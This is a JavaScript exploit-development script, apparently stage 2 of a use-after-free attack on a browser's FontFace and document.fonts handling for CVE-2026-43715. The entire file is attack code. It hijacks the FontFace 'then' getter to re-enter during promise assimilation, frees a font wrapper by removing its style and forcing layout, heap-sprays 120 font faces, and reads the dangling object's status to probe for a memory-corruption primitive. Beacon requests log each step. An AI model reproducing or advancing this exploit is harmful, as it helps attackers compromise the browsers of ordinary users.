// p454 — CVE-2026-43715 Stage 2: free the flipped wrapper + zombie read
// Beacon prefix: V454-
//
// p453 correction: the flip itself is silent in C++ (no .then getter hit).
// p452's THEN-2 was the promise-assimilation thenable check firing when
// hook() attached .then to the already-resolved loaded promise — a
// microtask artifact, NOT re-entry inside the confused dispatch.
//
// p454 uses that artifact deliberately: after the trigger, attach
// .loaded.then to every t1 face. The one assimilation that fires the
// getter (hits===2) identifies the flipped wrapper via `this`. There:
// read only its family (a string — drop the object ref immediately, a
// held JS ref would pin the C++ FontFace and prevent the free), remove
// its style + force layout (free), re-spray t2 faces.
//
// Then the experiment: after settling, re-enumerate document.fonts and
// read the status of every t1 face. If the freed wrapper still dangles
// in the set, that enumeration is a JS-reachable UAF read — crash or
// garbage status = primitive; clean 'gone' = the set is maintained
// synchronously and we hunt elsewhere.

(function() {
  function B(tag) {
    try { new Image().src = '/BEACON?V454-' + tag + '&t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  window.onerror = function(msg) {
    B('ONERROR-' + encodeURIComponent(String(msg)).slice(0, 80));
    return false;
  };

  var OK = 'local(Helvetica)';
  var BAD = 'local(Songti)';
  var hits = 0;
  var styles = {};                     // family -> style element
  var freed = false;

  function spray(prefix) {
    for (var k = 0; k < 120; k++) {
      var fam = prefix + 'x' + k;
      var st = document.createElement('style');
      st.textContent = '@font-face { font-family: ' + fam +
        '; src: ' + BAD + '; }';
      document.head.appendChild(st);
      styles[fam] = st;
      var d = document.createElement('div');
      d.style.fontFamily = fam;
      d.textContent = 'A';
      document.body.appendChild(d);
      document.body.offsetHeight;
    }
  }

  Object.defineProperty(FontFace.prototype, 'then', {
    get: function() {
      hits++;
      if (hits <= 3) B('THEN-' + hits);
      if (hits === 1) {
        var v = document.getElementById('v');
        if (v) {
          v.remove();
          document.body.offsetHeight;      // free happens here
          spray('t1');
        }
      } else if (hits === 2 && !freed) {
        freed = true;
        // `this` = the flipped wrapper. Take the name, drop the ref.
        var fam = String(this.family).replace(/['"]/g, '');
        B('T2-' + fam);
        var st = styles[fam];
        if (st) {
          st.remove();
          document.body.offsetHeight;      // attempt the free
          B('T2-FREED');
          spray('t2');
          B('T2-RESPRAYED');
        } else {
          B('T2-NOSTYLE');
        }
      }
      return undefined;
    },
    configurable: true
  });
  B('GETTER-SET');

  function findFace(fam) {
    var found = null;
    document.fonts.forEach(function(f) {
      if (f.family.replace(/['"]/g, '') === fam) found = f;
    });
    return found;
  }

  function hook() {
    var n = 0;
    for (var k = 0; k < 120; k++) {
      var f = findFace('t1x' + k);
      if (!f) continue;
      n++;
      // attach with neutral callbacks: the point is the assimilation
      // thenable check on the already-resolved promise (= the flip)
      f.loaded.then(function() {}, function() {});
    }
    B('HOOKED-' + n);
  }

  function round0() {
    var victim = document.createElement('style');
    victim.id = 'v';
    victim.textContent = 'x{}';
    document.head.appendChild(victim);

    var fs = document.createElement('style');
    fs.textContent = '@font-face { font-family: g0; src: ' + OK + '; }';
    document.head.appendChild(fs);
    document.body.offsetHeight;

    var face = findFace('g0');
    if (!face) { B('NOFACE'); return; }

    void face.loaded;
    B('LOAD-0');

    face.load().then(
      function() {
        B('SURVIVED-0-H' + hits);
        hook();
      },
      function(e) { B('NO-0-' + encodeURIComponent(String(e)).slice(0, 60)); }
    );
  }

  // Zombie read: enumerate the set and read statuses of t1 faces. The
  // freed wrapper may still be in here — reading it is the experiment.
  setTimeout(function() {
    var n1 = 0, loaded1 = 0, odd = [];
    document.fonts.forEach(function(f) {
      var fam = f.family.replace(/['"]/g, '');
      if (!/^t1x/.test(fam)) return;
      n1++;
      var s = f.status;                 // possible UAF read
      if (s === 'loaded') { loaded1++; odd.push(fam); }
    });
    var n2 = 0;
    document.fonts.forEach(function(f) {
      if (/^t2x/.test(f.family.replace(/['"]/g, ''))) n2++;
    });
    B('ZC-N1-' + n1 + '-L' + loaded1 +
      (odd.length ? '-ODD[' + odd.slice(0, 4).join(' ') + ']' : '') +
      '-N2-' + n2);
    B('ALIVE-3S-H' + hits);
  }, 3000);

  round0();
})();
